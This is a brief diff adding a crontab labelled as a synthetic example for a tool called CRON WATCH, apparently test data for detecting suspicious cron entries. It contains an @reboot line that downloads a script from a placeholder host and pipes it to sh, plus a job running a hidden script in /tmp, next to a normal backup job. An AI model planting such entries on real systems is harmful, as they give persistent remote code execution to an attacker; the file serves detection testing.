@@ -1,0 +1,5 @@
+# Synthetic example for CRON WATCH. Do not install as a live cron file.
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+@reboot curl https://example.invalid/bootstrap.sh | sh
+*/15 * * * * /tmp/.cache/maintenance.sh
+0 2 * * * /usr/local/bin/approved-backup --mode daily
